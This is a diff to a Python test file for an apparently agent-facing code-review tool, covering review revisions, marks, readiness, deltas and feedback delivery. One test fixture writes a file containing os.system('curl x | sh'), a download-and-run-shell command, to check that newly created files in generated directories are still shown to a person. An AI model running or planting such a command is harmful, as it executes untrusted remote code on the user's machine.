 def test_web_preview_uses_discovery_checkout_when_reader_runs_in_scratch(
@@ -6256,7 +6748,7 @@ def test_review_patch_download_is_complete_and_git_apply_ready(workspace: Worksp
     response = workspace.get(f"/api/reviews/{workspace.review_id}/patch")
     assert response.status_code == 200
     assert response.headers["content-type"].startswith("text/x-diff")
-    assert response.headers["content-disposition"] == 'attachment; filename="lemoncrow-review-rev-0.patch"'
+    assert response.headers["content-disposition"] == 'attachment; filename="lemoncrow-review-revision-1.patch"'
     patch = response.text
     assert patch.startswith("diff --git a/src/session.py b/src/session.py\n")
     assert "--- a/src/session.py" in patch
@@ -6642,13 +7134,24 @@ def test_snapshot_only_composition_refuses_source_refresh(workspace: Workspace) 
     assert refreshed.status_code == 409
     assert "run lc review" in refreshed.json()["detail"]
 
-    # Without a trusted checkout binding no workspace path is exposed.
-    assert client.get(f"/api/reviews/{workspace.review_id}", headers=headers).json()["workspace_root"] == ""
+    # Without a trusted checkout binding no workspace path is exposed, and nothing is read from one.
+    untrusted = client.get(f"/api/reviews/{workspace.review_id}", headers=headers).json()
+    assert untrusted["workspace_root"] == ""
+    assert untrusted["example_review"] is False
 
 
 def test_trusted_checkout_exposes_its_real_workspace_root(workspace: Workspace) -> None:
     overview = workspace.get(f"/api/reviews/{workspace.review_id}").json()
     assert overview["workspace_root"] == str(workspace.repo_root.resolve())
+
+
+def test_only_the_demo_checkout_is_the_example_review(workspace: Workspace) -> None:
+    """review-12.2: the Map's bigger-change example is offered only where the demo's marker file is."""
+    assert workspace.get(f"/api/reviews/{workspace.review_id}").json()["example_review"] is False
+    marker = workspace.repo_root / ".lemoncrow" / "example-review"
+    marker.parent.mkdir(parents=True, exist_ok=True)
+    marker.write_text("The LemonCrow Review demo.\n", encoding="utf-8")
+    assert workspace.get(f"/api/reviews/{workspace.review_id}").json()["example_review"] is True
 
 
 def test_change_proposal_insert_rechecks_current_revision_after_api_validation(
@@ -7308,7 +7811,7 @@ def test_bulk_review_marks_only_current_plain_targets(workspace: Workspace) -> N
         {
             "unit_key": "stale-target",
             "path": "",
-            "reason": "not a current review target",
+            "reason": "not a current part",
         },
     ]
 
@@ -7492,7 +7995,7 @@ def run():
     sections = [row for row in rows if row["kind"] == "document_section"]
     assert len(sections) == 1
     assert sections[0]["symbol"] == ""
-    assert sections[0]["label"] == "src/settings.py::Module declarations"
+    assert sections[0]["label"] == "src/settings.py::Imports and top-level code"
     assert not any(row["symbol"] in {"A", "B"} for row in rows)
     assert any(row["symbol"] == "__all__" for row in rows)
 
@@ -7616,7 +8119,7 @@ def test_ai_finding_fixed_requires_current_snapshot_evidence(workspace: Workspac
         json={"finding_disposition": "fixed", "finding_disposition_evidence": []},
     )
     assert refused.status_code == 409
-    assert "current Snapshot" in refused.json()["detail"]
+    assert "current revision" in refused.json()["detail"]
 
     evidence = workspace.store.add_evidence(
         ReviewEvidence(
@@ -7887,7 +8390,7 @@ def test_bulk_marking_accepts_current_normal_targets_not_arbitrary_raw_units(wor
         )
         assert refused.status_code == 200
         assert refused.json()["marked"] == []
-        assert refused.json()["skipped"][0]["reason"] == "not a current review target"
+        assert refused.json()["skipped"][0]["reason"] == "not a current part"
 
 
 def test_bulk_marking_refuses_a_file_whose_open_objection_belongs_to_no_target(workspace: Workspace) -> None:
@@ -8178,6 +8681,35 @@ def test_an_unmapped_degraded_name_still_gets_a_sentence() -> None:
     assert degraded_note("a_signal_added_next_year")
     assert "3" in degraded_note("intent_to_add_excluded:3")
     assert degraded_note("hunk_patch_truncated")
+
+
+def test_no_degraded_note_carries_a_raw_signal_code() -> None:
+    """`non_definition_symbols` reached the UI as "a producer fell back (non_definition_symbols)".
+
+    The payload's `name` already carries the code; the note is prose for a
+    person, so neither a mapped nor an unmapped signal may print a snake_case
+    token into it.
+    """
+    import re
+
+    from lemoncrow_client import review_words
+
+    from lemoncrow.pro.capabilities.review import api as review_api
+
+    codes = {
+        *review_api._DEGRADED_TEXT,
+        *review_words._DEGRADED_SENTENCES,
+        *(f"{prefix}:2" for prefix in review_words._COUNTED_SENTENCES),
+        "a_signal_added_next_year",
+        "impact_signal_added_next_year",
+        "provenance_signal_added_next_year",
+    }
+    snake = re.compile(r"[a-z]+(_[a-z0-9]+)+")
+    for code in sorted(codes):
+        note = degraded_note(code)
+        assert note, code
+        assert snake.search(note) is None, f"{code}: {note}"
+        assert "producer fell back" not in note, code
 
 
 def test_a_counted_range_fact_is_not_described_as_a_producer_falling_back() -> None:
@@ -10062,7 +10594,7 @@ def test_the_reviews_list_waits_on_the_agent_then_returns_the_review_when_addres
     assert reader["published"] == 1
     waiting = _list_handoff(workspace)
     assert waiting["primary_bucket"] == "waiting_on_agent"
-    assert waiting["handoff_label"] == "Claude"
+    assert waiting["handoff_label"] == "Claude Code"
     assert waiting["waiting_on_agent_count"] == 1
     # Work left to judge comes first: not waiting yet.
     assert "primary_bucket" not in _list_handoff(workspace, actionable_targets=2)
@@ -10422,6 +10954,34 @@ def test_refresh_target_delta_reopens_only_the_reviewed_target_that_changed(work
     assert delta["preserved"] == []
 
 
+def test_a_pure_rename_reads_as_reopened_in_the_target_delta_as_it_does_in_the_raw_counts(
+    workspace: Workspace,
+) -> None:
+    """P11-3 m3: the same reviewed part cannot be "reopened" in one count and "added" in the other."""
+
+    listed = workspace.get(f"/api/reviews/{workspace.review_id}/units").json()
+    unit_key = next(
+        row["unit_key"] for row in listed["units"] if row["label"] == "src/session.py::SessionManager.refresh"
+    )
+    marked = workspace.post(
+        f"/api/reviews/{workspace.review_id}/marks", json={"unit_key": unit_key, "state": "reviewed"}
+    )
+    assert marked.status_code == 200, marked.text
+
+    _write(workspace.repo_root, "src/session.py", _CHANGED_SOURCE.replace("def refresh(", "def renew("))
+    response = workspace.post(f"/api/reviews/{workspace.review_id}/refresh")
+    assert response.status_code == 200, response.text
+    refreshed = response.json()["refreshed"]
+
+    delta = refreshed["target_delta"]
+    renewed = "src/session.py::SessionManager.renew"
+    assert refreshed["reopened"] == 1
+    assert [row["label"] for row in delta["reopened"]] == [renewed]
+    assert renewed not in [row["label"] for row in delta["added"]]
+    assert "src/session.py::SessionManager.refresh" not in [row["label"] for row in delta["removed"]]
+    assert refreshed["discarded"] == []
+
+
 def test_a_refresh_names_the_verdicts_it_discarded_and_the_units_that_left(workspace: Workspace) -> None:
     """The browser must not delete a human's approval and report five counts.
 
@@ -10442,9 +11002,14 @@ def test_a_refresh_names_the_verdicts_it_discarded_and_the_units_that_left(works
     assert marked.status_code == 200, marked.text
     assert marked.json()["recorded"] == "reviewed"
 
-    # The agent renames the reviewed method away: its unit leaves the review, so
-    # the verdict on it has to go -- and has to be named on the way out.
-    _write(workspace.repo_root, "src/session.py", _CHANGED_SOURCE.replace("def refresh(", "def renew("))
+    # The agent renames the reviewed method away *and* reworks it: its unit leaves the review with no
+    # same-body twin to follow (a pure rename reopens instead; see test_review_symbol_moves), so the
+    # verdict on it has to go -- and has to be named on the way out.
+    _write(
+        workspace.repo_root,
+        "src/session.py",
+        _CHANGED_SOURCE.replace("def refresh(", "def renew(").replace('"ok"', '"renewed"'),
+    )
 
     response = workspace.post(f"/api/reviews/{workspace.review_id}/refresh")
     assert response.status_code == 200, response.text
@@ -10498,7 +11063,8 @@ def test_a_refresh_names_the_verdicts_it_discarded_and_the_units_that_left(works
     _write(
         workspace.repo_root,
         "src/session.py",
-        _CHANGED_SOURCE.replace("def refresh(", "def renew(") + "\n\ndef unrelated_helper() -> int:\n    return 7\n",
+        _CHANGED_SOURCE.replace("def refresh(", "def renew(").replace('"ok"', '"renewed"')
+        + "\n\ndef unrelated_helper() -> int:\n    return 7\n",
     )
     third = workspace.post(f"/api/reviews/{workspace.review_id}/refresh")
     assert third.status_code == 200, third.text
@@ -10829,7 +11395,7 @@ def test_projection_serves_the_plan_and_shares_the_target_queue(workspace: Works
     assert "claim_evidence_scope_mismatch" in [reason["code"] for reason in targets[0]["priority"]["reasons"]]
     (claim,) = [row for row in projection["claims"] if row["id"] in item["claim_ids"]]
     assert (claim["summary"], claim["summary_text"]) == ("partial", "Partial evidence")
-    assert claim["result_line"] == "1 linked check passed on Snapshot 0"
+    assert claim["result_line"] == "1 linked check passed on Revision 1"
     (decision,) = projection["decisions"]
     assert (decision["key"], decision["read_only"]) == ("status-word", False)
     assert (decision["state"]["disposition"], decision["state"]["reason"], decision["state"]["tier"]) == (
@@ -10987,6 +11553,25 @@ def test_trusted_base_browser_policy_governs_current_review(tmp_path: Path) -> N
     scenarios = {row["browser"]["scenario"]: row for row in verification["checks"] if row.get("browser")}
     assert "session-refresh" in scenarios
     assert scenarios["session-refresh"]["required"] is True
+
+
+def test_p7_3_a_change_that_edits_the_rules_file_says_so_and_a_plain_change_does_not(tmp_path: Path) -> None:
+    base = "version: 1\nrules:\n  - stable_key: a\n    instruction: Keep a.\n    paths: [src/session.py]\n"
+    head = base + "  - stable_key: b\n    instruction: Keep b.\n    paths: [src/session.py]\n"
+    edited = _browser_workspace(tmp_path / "edited", config=base, head_config=head, mutate_head_config=True)
+    policy = edited.get(f"/api/reviews/{edited.review_id}/projection").json()["policy"]
+    assert policy["edits_policy"] == {"files": [".lemoncrow/review.yaml"]}
+    plain = _browser_workspace(tmp_path / "plain")
+    assert plain.get(f"/api/reviews/{plain.review_id}/projection").json()["policy"]["edits_policy"] == {"files": []}
+    # A local install has one reviewer and no identities, so nothing gates and the gate route does not exist.
+    assert edited.get(f"/api/reviews/{edited.review_id}/policy-edit").status_code == 404
+    # The history of the rules file on the base branch is read from the checkout's own git history.
+    history = edited.get(f"/api/reviews/{edited.review_id}/policy-history").json()
+    assert history["path"] == ".lemoncrow/review.yaml"
+    assert history["available"] is True
+    assert [row["subject"] for row in history["entries"]] and all(
+        set(row) == {"commit", "date", "author", "subject"} for row in history["entries"]
+    )
 
 
 def test_phase6_policy_projection_keeps_base_rule_and_marks_head_change_future_only(tmp_path: Path) -> None:
@@ -11394,6 +11979,113 @@ def test_browser_policy_read_before_the_base_attaches_yields_to_the_base(
     assert "head-required" not in scenarios
 
 
+def test_batch_guard_read_before_the_base_attaches_yields_to_the_base(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    # A local server reads a Snapshot's old side only from the tree attach-base adds after the revision is
+    # visible (it has no checkout to ask Git). The capture warm-up's targets read can come first: a quick check
+    # is then held for want of its old text, and must be cleared by the next read once the base attaches.
+    repo_root = tmp_path / "repo"
+    repo = _init_repo(repo_root)
+    old = 'def label():\n    return "Total"\n'
+    _write(repo_root, "app/labels.py", old)
+    _commit(repo, "base", 0)
+    _write(repo_root, "app/labels.py", 'def label():\n    return "Sum"\n')
+    store_root = tmp_path / "store"
+    store = ReviewStore(store_root)
+    rng = resolve_rev_range(repo_root, None, working_tree=True)
+    build = build_review_packet_with_blobs(repo_root, rng, store_root=store_root, with_patch_text=True)
+    session = open_or_create_session(store, repo_root, rng, title=build.packet.title)
+    snapshot_revision(store, session, repo_root, rng, store_root=store_root, build=build)
+    revision = store.latest_revision(session.id)
+    assert revision is not None
+    store.publish_snapshot(session.id, revision.id)
+    # Like the local server's per-repository Reader: no Git checkout behind the API to read the base commit from.
+    (repo_root / ".git").rename(tmp_path / "moved.git")
+    app = FastAPI()
+    register_review_api(app, store, auth_dependency=make_token_dependency(TOKEN), repo_root=repo_root, port=PORT)
+    workspace = Workspace(TestClient(app, base_url=BASE), store, store_root, repo_root, session.id)
+
+    def guard() -> dict[str, Any]:
+        response = workspace.get(f"/api/reviews/{session.id}/targets", params={"order": "recommended"})
+        assert response.status_code == 200, response.text
+        (label,) = [row for row in response.json()["targets"] if row["path"] == "app/labels.py"]
+        assert label["answer"]["category"] == "quick_check"
+        return label["batch_guard"]
+
+    before = guard()
+    assert before["guarded"] is True and before["code"] == "unverifiable"
+    payload = old.encode()
+    digest = hashlib.sha256(payload).hexdigest()
+    real = store.read_source_content
+    monkeypatch.setattr(store, "read_source_content", lambda d: payload if d == digest else real(d))
+    store.write_source_tree_artifact(
+        session.id,
+        revision.id,
+        {"app/labels.py": {"content_digest": digest, "mode": 0o100644, "size": len(payload)}},
+        side="old",
+    )
+    assert guard() == {"guarded": False, "code": "", "reason": ""}
+
+
+def test_old_side_contents_read_from_the_checkout_commit_before_the_base_attaches(tmp_path: Path) -> None:
+    # A local server's Reader has a scratch root, not a Git checkout, and the capture freezes the base View after the
+    # Reader opens. Until then the old side is the base commit, which the trusted checkout holds by id: a card that
+    # opens in that window reads it rather than a 409.
+    repo_root = tmp_path / "repo"
+    repo = _init_repo(repo_root)
+    old = 'def label():\n    return "Total"\n'
+    _write(repo_root, "app/labels.py", old)
+    _commit(repo, "base", 0)
+    new = 'def label():\n    return "Sum"\n'
+    _write(repo_root, "app/labels.py", new)
+    store_root = tmp_path / "store"
+    store = ReviewStore(store_root)
+    rng = resolve_rev_range(repo_root, None, working_tree=True)
+    build = build_review_packet_with_blobs(repo_root, rng, store_root=store_root, with_patch_text=True)
+    session = open_or_create_session(store, repo_root, rng, title=build.packet.title)
+    snapshot_revision(store, session, repo_root, rng, store_root=store_root, build=build)
+    revision = store.latest_revision(session.id)
+    assert revision is not None
+    store.publish_snapshot(session.id, revision.id)
+    scratch = tmp_path / "scratch"
+    scratch.mkdir()
+    # The working file moves on; the old side must still be the base commit, never the checkout's file.
+    _write(repo_root, "app/labels.py", 'def label():\n    return "Later"\n')
+
+    def contents(source_repo_root: Path | None) -> Any:
+        app = FastAPI()
+        register_review_api(
+            app,
+            store,
+            auth_dependency=make_token_dependency(TOKEN),
+            repo_root=scratch,
+            port=PORT,
+            session_repo_identity=session.repo_root,
+            source_repo_root=source_repo_root,
+        )
+        workspace = Workspace(TestClient(app, base_url=BASE), store, store_root, repo_root, session.id)
+        return workspace.get(
+            f"/api/reviews/{session.id}/files/app/labels.py/contents", params={"revision_id": revision.id}
+        )
+
+    assert contents(None).status_code == 409
+    response = contents(repo_root)
+    assert response.status_code == 200, response.text
+    assert response.json()["old_content"] == old
+    assert response.json()["new_content"] == new
+
+
+def test_overview_names_the_packet_cursor_the_live_feed_compares(tmp_path: Path) -> None:
+    # The Reader primes its live feed from the overview it read; the two cursors must be the same value.
+    workspace = _browser_workspace(tmp_path)
+    overview = workspace.get(f"/api/reviews/{workspace.review_id}")
+    assert overview.status_code == 200, overview.text
+    state = workspace.get(f"/api/reviews/{workspace.review_id}/live-state")
+    assert state.status_code == 200, state.text
+    assert overview.json()["packet_cursor"] == state.json()["packet_cursor"] != ""
+
+
 def test_policy_can_become_authoritative_once_it_is_in_a_later_review_base(tmp_path: Path) -> None:
     proposed = _browser_workspace(
         tmp_path / "proposed",
@@ -11556,6 +12248,9 @@ def test_browser_agent_statement_and_generic_screenshot_do_not_satisfy_browser_r
 
 
 def _arm(landing: Workspace) -> dict[str, Any]:
+    session = landing.store.get_session(landing.review_id)
+    if session is None or session.status != "finished":
+        _finish_review(landing)
     inspected = landing.get(f"/api/reviews/{landing.review_id}/readiness").json()
     assert inspected["armable"] is True, inspected
     armed = landing.post(
@@ -11615,7 +12310,7 @@ def test_armed_landing_is_disarmed_when_a_human_requests_changes_after_arming(wo
     readiness = landing.get(f"/api/reviews/{workspace.review_id}/readiness").json()
     assert readiness["landing"]["armed"] is False
     assert readiness["landing"]["state"] == "blocked"
-    assert "No unresolved request-change comments" in readiness["landing"]["detail"]
+    assert "Unresolved request-change comments" in readiness["landing"]["detail"]
 
 
 def test_any_snapshot_capture_marks_armed_landing_stale_and_owes_provider_cancel(workspace: Workspace) -> None:
@@ -11960,7 +12655,7 @@ def test_projection_names_what_changed_since_the_previous_snapshot(workspace: Wo
     delta = workspace.get(f"/api/reviews/{workspace.review_id}/projection").json()["delta"]
     assert delta["since_snapshot"] == 0
     assert delta["changed"], delta
-    assert delta["added"] and not set(delta["added"]) & before, "added targets are new on this Snapshot"
+    assert delta["added"] and not set(delta["added"]) & before, "added targets are new on this revision"
     assert not set(delta["changed"]) & set(delta["added"])
     assert delta["stale_evidence"] == ["CI / unit tests"]
     assert delta["reopened_decisions"] == ["status-word"]
@@ -11983,7 +12678,24 @@ def test_the_delta_names_a_removed_target_and_not_an_unchanged_one(workspace: Wo
     delta = workspace.get(f"/api/reviews/{workspace.review_id}/projection").json()["delta"]
     assert delta["since_snapshot"] == 1
     assert delta["removed"] >= 1
+    assert len(delta["removed_parts"]) == min(delta["removed"], 25)
+    assert all(part.startswith("src/session.py") for part in delta["removed_parts"])
     assert (delta["changed"], delta["added"]) == ([], []), "a reviewed, unchanged target is never named"
+
+
+def test_the_delta_counts_comments_carried_from_and_resolved_since_the_previous_snapshot(workspace: Workspace) -> None:
+    kept_open = _comment(workspace, "Still unsure about this.")
+    resolved_before = _comment(workspace, "Fixed before the push.", line=8)
+    resolved_after = _comment(workspace, "Fixed by the push.", line=9)
+    assert workspace.patch(f"/api/annotations/{resolved_before['id']}", json={"state": "resolved"}).status_code == 200
+
+    _write(workspace.repo_root, "src/untouched.py", _UNTOUCHED_SOURCE + "\n\ndef second():\n    return 2\n")
+    assert workspace.post(f"/api/reviews/{workspace.review_id}/refresh").status_code == 200
+    assert workspace.patch(f"/api/annotations/{resolved_after['id']}", json={"state": "resolved"}).status_code == 200
+    _comment(workspace, "A new question on this revision.", line=11)
+
+    delta = workspace.get(f"/api/reviews/{workspace.review_id}/projection").json()["delta"]
+    assert delta["comments"] == {"carried": 1, "resolved": 2}, (kept_open["id"], delta)
 
 
 def test_finish_preview_discloses_outstanding_decisions(workspace: Workspace, monkeypatch: pytest.MonkeyPatch) -> None:
@@ -12500,7 +13212,7 @@ def test_a_pinned_session_receives_every_comment(workspace: Workspace, monkeypat
     assert preview["delivery"]["targets"] == ["codex:thread-9"]
     response = _deliver(workspace, preview)
     assert response.status_code == 200, response.text
-    assert calls == [("codex", "thread-9")], "the pinned session, not the Snapshot's author"
+    assert calls == [("codex", "thread-9")], "the pinned session, not the revision's author"
 
 
 def test_copy_for_the_author_is_recorded_only_when_confirmed(workspace: Workspace) -> None:
@@ -12634,7 +13346,7 @@ def test_destination_options_list_known_sessions_new_hosts_and_copy(
     assert ("session", "claude", "bbbb2222") in kinds
     assert kinds[-1] == ("export", "", "")
     by_session = {item.get("session_id"): item for item in body["options"] if item["kind"] == "session"}
-    assert by_session["aaaa1111"]["detail"].startswith("wrote Snapshot")
+    assert by_session["aaaa1111"]["detail"].startswith("wrote Revision")
     assert by_session["bbbb2222"]["detail"] == "running here"
     assert (
         by_session["aaaa1111"]["activity_at"] == workspace.store.list_revision_attributions(revision.id)[0].created_at
@@ -12776,7 +13488,7 @@ def test_ai_review_projection_is_passive_and_run_is_snapshot_bound(
     assert captured["revision"].id == projection["revision_id"]
     assert captured["effort"] == "thorough"
     assert captured["targets"], "the AI run must consume canonical Review targets"
-    assert captured["cancellation"] is None, "manual exact-Snapshot runs must not inherit Auto supersession"
+    assert captured["cancellation"] is None, "manual exact-revision runs must not inherit Auto supersession"
 
     stale = workspace.post(
         f"/api/reviews/{workspace.review_id}/ai-review",
@@ -12829,7 +13541,7 @@ def test_ai_review_auto_is_backend_idempotent_and_does_not_cross_capability_boun
     def fake_run(**kwargs: Any) -> Result:
         nonlocal calls
         calls += 1
-        assert callable(kwargs["cancellation"]), "Auto must receive a current-Snapshot cancellation seam"
+        assert callable(kwargs["cancellation"]), "Auto must receive a current-revision cancellation seam"
         assert kwargs["cancellation"]() is False
         revision = kwargs["revision"]
         seeded, claimed = workspace.store.claim_intelligence_run(
@@ -13217,3 +13929,376 @@ def test_an_error_text_shown_to_a_reader_never_carries_an_absolute_server_path()
     assert _without_paths("review surface discovery failed (HTTP/1.1) in src/app") == (
         "review surface discovery failed (HTTP/1.1) in src/app"
     )
+
+
+@pytest.fixture
+def generated_workspace(tmp_path: Path) -> Workspace:
+    """A Review whose trusted base marks `src/gen.py` generated, with one ordinary and one generated change."""
+
+    repo_root = tmp_path / "repo"
+    repo = _init_repo(repo_root)
+    _write(repo_root, ".gitattributes", "src/gen.py linguist-generated\n")
+    _write(repo_root, "src/session.py", _BASE_SOURCE)
+    _write(repo_root, "src/gen.py", "VALUE = 1\n")
+    _commit(repo, "base", 0)
+    _write(repo_root, "src/session.py", _CHANGED_SOURCE)
+    _write(repo_root, "src/gen.py", "VALUE = 2\n")
+
+    store_root = tmp_path / "store"
+    store = ReviewStore(store_root)
+    rng = resolve_rev_range(repo_root, None, working_tree=True)
+    build = build_review_packet_with_blobs(repo_root, rng, store_root=store_root, with_patch_text=True)
+    session = open_or_create_session(store, repo_root, rng, title=build.packet.title)
+    revision = snapshot_revision(store, session, repo_root, rng, store_root=store_root, build=build)
+    store.publish_snapshot(session.id, revision.id)
+    app = FastAPI()
+    register_review_api(app, store, auth_dependency=make_token_dependency(TOKEN), repo_root=repo_root, port=PORT)
+    return Workspace(TestClient(app, base_url=BASE), store, store_root, repo_root, session.id)
+
+
+def test_a_part_is_asked_by_its_category_and_a_marked_generated_file_is_accepted_by_rule(
+    generated_workspace: Workspace,
+) -> None:
+    workspace = generated_workspace
+    base = f"/api/reviews/{workspace.review_id}"
+    targets = workspace.get(f"{base}/targets").json()["targets"]
+    by_path: dict[str, list[dict[str, Any]]] = {}
+    for row in targets:
+        by_path.setdefault(row["path"], []).append(row["answer"])
+    assert {answer["category"] for answer in by_path["src/session.py"]} == {"quick_check"}
+    generated = {
+        "category": "accepted_by_rule",
+        "rule": "generated_files",
+        "rule_label": "generated files",
+        "reason": "rule:generated_files",
+    }
+    assert by_path["src/gen.py"] and all(answer == generated for answer in by_path["src/gen.py"])
+    overview = workspace.get(base).json()
+    counts = overview["answers"]
+    assert counts["accepted_by_rule"] == len(by_path["src/gen.py"])
+    assert counts["quick_check"] == len(by_path["src/session.py"])
+    assert counts["rules"] == {"generated_files": counts["accepted_by_rule"]}
+    assert overview["progress"]["accepted_by_rule"] == counts["accepted_by_rule"]
+    # Listed, never auto-reviewed: nothing was recorded for any of them.
+    assert all(row["state"] == "unreviewed" for row in targets)
+    assert workspace.store.list_marks(workspace.review_id) == ()
+    # The stamp is on the stored unit, so the signed record can cite it later.
+    revision = workspace.store.latest_revision(workspace.review_id)
+    assert revision is not None
+    stamps = {(u.path, u.answer_category, u.category_rule) for u in workspace.store.list_units(revision.id)}
+    assert ("src/gen.py", "accepted_by_rule", "generated_files") in stamps
+    assert ("src/session.py", "quick_check", "") in stamps
+
+
+def test_a_part_left_for_later_is_recorded_but_never_judged_anywhere_the_reader_counts(
+    generated_workspace: Workspace,
+) -> None:
+    """P0-4 / P1-2: `later` pends readiness and every progress tally until a person judges the part."""
+
+    workspace = generated_workspace
+    base = f"/api/reviews/{workspace.review_id}"
+    targets = workspace.get(f"{base}/targets").json()["targets"]
+    assert len(targets) >= 2 and all(row["state"] == "unreviewed" for row in targets)
+    first = next(row for row in targets if row["path"] == "src/gen.py")
+    rest = [row for row in targets if row is not first]
+
+    for row in rest:
+        assert (
+            workspace.post(f"{base}/marks", json={"unit_key": row["unit_key"], "state": "reviewed"}).status_code == 200
+        )
+    later = workspace.post(f"{base}/marks", json={"unit_key": first["unit_key"], "state": "later"})
+    assert later.status_code == 200, later.text
+    body = later.json()
+    assert (body["requested"], body["recorded"], body["downgraded"]) == ("later", "later", False)
+    assert body["target"]["state"] == "later"
+    assert body["target"]["changed_since_mark"] is False
+    progress = body["progress"]
+    assert (progress["later"], progress["reviewed"], progress["target_count"]) == (1, len(rest), len(targets))
+    # A counter per state, none dropped: the partition covers every part.
+    states = ("reviewed", "changed_since_review", "needs_changes", "unreviewed", "unknown", "later")
+    assert sum(progress[name] for name in states) == progress["target_count"]
+    # The outline row of the file carries it too, so a client that moves counts between states can follow.
+    row = next(item for item in body["outline"] if item["path"] == "src/gen.py")
+    assert row["later"] == 1 and row["reviewed"] == len(rest) - sum(1 for r in rest if r["path"] != "src/gen.py")
+
+    # It stays outstanding in the queue, with its own reason.
+    stored = next(
+        row for row in workspace.get(f"{base}/targets").json()["targets"] if row["unit_key"] == first["unit_key"]
+    )
+    assert stored["priority"]["outstanding"] is True
+    assert stored["priority"]["reasons"][0] == {"code": "left_for_later", "detail": "You left this for later"}
+    # Setting aside a part does not change how it is asked.
+    assert stored["answer"]["category"] == "accepted_by_rule"
+
+    # Readiness reads the revision as not reviewed, exactly as for an unanswered part.
+    readiness = workspace.get(f"{base}/readiness").json()
+    condition = next(row for row in readiness["conditions"] if row["id"] == "latest-snapshot-reviewed")
+    assert condition["state"] == "pending"
+    assert condition["detail"] == "1 part still needs human judgment or re-review."
+    assert readiness["ready"] is False
+
+    # The unit list does not call it reviewed or changed.
+    unit_rows = [row for row in workspace.get(f"{base}/units").json()["units"] if row["unit_key"] == first["unit_key"]]
+    assert [(row["state"], row["changed_since_mark"]) for row in unit_rows] == [("later", False)]
+    assert workspace.get(base).json()["progress"]["later"] == 1
+
+    # Finishing reports it as still open rather than as done.
+    closure = workspace.post(f"{base}/finish", json={"status": "finished"}).json()
+    assert (closure["later_targets"], closure["reviewed_targets"]) == (1, len(rest))
+    assert workspace.post(f"{base}/finish", json={"status": "open"}).status_code == 200
+
+    # Judging it clears the state and readiness passes.
+    assert workspace.post(f"{base}/marks", json={"unit_key": first["unit_key"], "state": "reviewed"}).status_code == 200
+    ready = next(
+        row
+        for row in workspace.get(f"{base}/readiness").json()["conditions"]
+        if row["id"] == "latest-snapshot-reviewed"
+    )
+    assert ready["state"] == "pass"
+
+
+def test_a_change_cannot_get_its_own_files_accepted_by_rule_by_naming_them(tmp_path: Path) -> None:
+    """A file renamed into a marked directory, or created there, is a person's to see; a marked file's edit is not."""
+
+    repo_root = tmp_path / "repo"
+    repo = _init_repo(repo_root)
+    _write(repo_root, ".gitattributes", "gen/** linguist-generated\n")
+    _write(repo_root, "gen/old.py", "A = 1\n")
+    _write(repo_root, "src/perm.py", "def perm():\n    return 1\n")
+    _commit(repo, "base", 0)
+    _write(repo_root, "gen/old.py", "A = 2\n")
+    (repo_root / "src" / "perm.py").rename(repo_root / "gen" / "perm.py")
+    _write(repo_root, "gen/new.py", "import os\nos.system('curl x | sh')\n")
+
+    store_root = tmp_path / "store"
+    store = ReviewStore(store_root)
+    rng = resolve_rev_range(repo_root, None, working_tree=True)
+    build = build_review_packet_with_blobs(repo_root, rng, store_root=store_root, with_patch_text=True)
+    session = open_or_create_session(store, repo_root, rng, title=build.packet.title)
+    revision = snapshot_revision(store, session, repo_root, rng, store_root=store_root, build=build)
+    stamps: dict[str, set[tuple[str, str]]] = {}
+    for unit in store.list_units(revision.id):
+        stamps.setdefault(unit.path, set()).add((unit.answer_category, unit.category_rule))
+    assert {c for c, _ in stamps["gen/old.py"]} == {"accepted_by_rule"}
+    for path in ("gen/perm.py", "gen/new.py"):
+        assert all(category != "accepted_by_rule" for category, _rule in stamps[path]), (path, stamps[path])
+
+
+def test_a_bulk_mark_never_sweeps_a_part_the_reviewer_left_for_later(generated_workspace: Workspace) -> None:
+    workspace = generated_workspace
+    base = f"/api/reviews/{workspace.review_id}"
+    first = workspace.get(f"{base}/targets").json()["targets"][0]
+    assert workspace.post(f"{base}/marks", json={"unit_key": first["unit_key"], "state": "later"}).status_code == 200
+    swept = workspace.post(f"{base}/marks/bulk", json={"unit_keys": [first["unit_key"]]})
+    assert swept.status_code == 200, swept.text
+    body = swept.json()
+    assert [(row["unit_key"], row["reason"]) for row in body["skipped"]] == [
+        (first["unit_key"], "you left this for later; answer it individually")
+    ]
+    stored = next(
+        row for row in workspace.get(f"{base}/targets").json()["targets"] if row["unit_key"] == first["unit_key"]
+    )
+    assert stored["state"] == "later"
+
+
+def test_a_past_revisions_annotations_report_what_was_handed_off_while_it_was_latest(
+    workspace: Workspace, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The cold `/rev/<n>` rule reads Revision n-1's delivery counts; the latest revision's start again at zero."""
+
+    session_id = "11111111-2222-4333-8444-555555555555"
+    _make_latest_revision_exact_claude(workspace, session_id)
+    workspace.post(
+        f"/api/reviews/{workspace.review_id}/annotations",
+        json={"path": "src/session.py", "start_line": 10, "body": "change this"},
+    )
+    monkeypatch.setattr(
+        "lemoncrow.pro.capabilities.review.delivery.deliver_to_claude_session",
+        lambda target, _repo, _feedback: ClaudeDeliveryResult("sent", f"claude:{target}", remote_ref="deadbeef"),
+    )
+    before = workspace.get(f"/api/reviews/{workspace.review_id}/revisions/0/annotations").json()["feedback"]
+    assert (before["published"], before["addressed"]) == (0, 0)
+    delivered = workspace.post(
+        f"/api/reviews/{workspace.review_id}/feedback/deliver", json=_prepared_feedback_body(workspace)
+    )
+    assert delivered.status_code == 200, delivered.text
+
+    _write(workspace.repo_root, "src/session.py", _CHANGED_SOURCE.replace('"invalid"', '"rev-one"'))
+    assert workspace.post(f"/api/reviews/{workspace.review_id}/refresh").status_code == 200
+
+    first = workspace.get(f"/api/reviews/{workspace.review_id}/revisions/0/annotations").json()["feedback"]
+    assert (first["published"], first["addressed"]) == (1, 0)
+    latest = workspace.get(f"/api/reviews/{workspace.review_id}/annotations").json()["feedback"]
+    assert (latest["published"], latest["addressed"]) == (0, 0)
+
+
+def test_policy_projection_lists_the_focus_rules_in_force(tmp_path: Path) -> None:
+    config = 'version: 1\nreview:\n  focus:\n    - paths: ["app/auth/**"]\n      criticality: critical\n      require: [security]\n'
+    workspace = _browser_workspace(tmp_path / "focus", config=config)
+    authority = workspace.get(f"/api/reviews/{workspace.review_id}/projection").json()["policy"]["authority"]
+    focus = [row for row in authority["focus"] if row["paths"] == ["app/auth/**"]]
+    assert [(row["criticality"], row["require"]) for row in focus] == [("critical", ["security"])]
+
+
+def _budget_world(workspace: Workspace, monkeypatch: pytest.MonkeyPatch) -> tuple[list[str], Any]:
+    """A provider that records every request, and an architecture delta with one changed relationship to explain."""
+
